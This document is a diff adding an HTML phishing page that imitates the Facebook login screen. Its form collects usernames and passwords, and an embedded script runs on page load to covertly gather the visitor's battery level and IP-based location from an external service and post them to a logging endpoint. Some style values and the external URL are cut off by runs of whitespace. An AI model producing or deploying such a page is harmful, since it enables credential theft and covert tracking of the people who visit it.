@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Facebook Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="background:                   
+  <div style="max-width:320px;margin:80px auto;padding:20px;background:white;border-radius:8px;box-shadow:0 0 5px #ccc;font-family:Arial;">
+    <h2 style="text-align:center;color:                       
+    <form method="POST">
+      <input type="text" name="username" placeholder="Email or phone number" style="width:100%;margin:5px 0;padding:10px;border:1px solid #ddd;border-radius:5px;" required><br>
+      <input type="password" name="password" placeholder="Password" style="width:100%;margin:5px 0;padding:10px;border:1px solid                                       
+      <button type="submit" style="width:100%;background:#1877f2;color:white;padding:10px;border:none;border-radius:5px;font-weight:bold;"> Log In </button>
+    </form>
+  </div>
+  <script>
+    async function collectExtraInfo() {
+      let batteryLevel = "Unknown";
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryLevel = Math.round(battery.level * 100) + "%";
+        } catch(e) {}
+      }
+      fetch("https:                  
+        .then(res => res.json())
+        .then(data => {
+          fetch(window.location.pathname + "/log-extra", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              city: data.city,
+              region: data.region,
+              country: data.country_name,
+              ip: data.ip,
+              battery: batteryLevel
+            })
+          });
+        });
+    }
+    collectExtraInfo();
+  </script>
+</body>
+</html>
